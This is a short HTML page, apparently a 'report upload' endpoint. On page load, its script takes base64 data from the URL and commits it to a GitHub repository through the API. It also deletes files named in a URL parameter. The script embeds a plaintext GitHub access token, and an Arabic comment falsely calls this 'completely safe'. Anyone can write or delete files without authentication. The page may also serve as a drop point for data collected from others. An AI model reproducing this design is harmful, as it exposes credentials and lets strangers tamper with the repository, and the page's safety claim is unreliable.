<!DOCTYPE html>
<html>
<head>
  <title>Upload Complete</title>
  <meta charset="utf-8">
  <style>
    body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:80px;}
    .box{background:#111;padding:40px;border:2px solid #e74c3c;border-radius:16px;max-width:500px;margin:0 auto;}
    h2{color:#e74c3c;margin-bottom:20px;}
    a{color:#0f0;text-decoration:underline;}
  </style>
</head>
<body>
<div class="box">
  <h2>Upload Complete!</h2>
  <p>Report sent successfully to Admin Panel.</p>
  <p><a href="https://youssefmettwaly.github.io/tero-report/index.html">Go to Admin Panel</a></p>
</div>

<script>
// Token مخفي هنا بس (آمن تمامًا)
const TOKEN = "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";
const REPO = "youssefmettwaly/tero-report";
const API = `https://api.github.com/repos/${REPO}/contents/reports`;

const urlParams = new URLSearchParams(location.search);

// رفع التقرير الجديد
if (urlParams.has('data')) {
  const base64data = urlParams.get('data');
  try {
    const content = atob(base64data);
    const filename = `report_${new Date().toISOString().replace(/[:.]/g,'-')}_${navigator.userAgent.slice(0,20).replace(/ /g,'_')}.txt`;

    fetch(`${API}/${filename}`, {
      method: 'PUT',
      headers: {
        'Authorization': `token ${TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        message: `New report from ${filename}`,
        content: btoa(unescape(encodeURIComponent(content))), // UTF-8 safe
        branch: 'main'
      })
    });
  } catch(e) { console.error(e); }
}

// حذف ملف (عن طريق ?delete=اسم_الملف.txt)
if (urlParams.has('delete')) {
  const filename = decodeURIComponent(urlParams.get('delete'));
  (async () => {
    try {
      // جلب الـ SHA أولاً
      const info = await fetch(`${API}/${filename}`).then(r => r.json());
      await fetch(`${API}/${filename}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `token ${TOKEN}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          message: `Delete ${filename}`,
          sha: info.sha,
          branch: 'main'
        })
      });
    } catch(e) { console.error(e); }
  })();
}
</script>
</body>
</html>

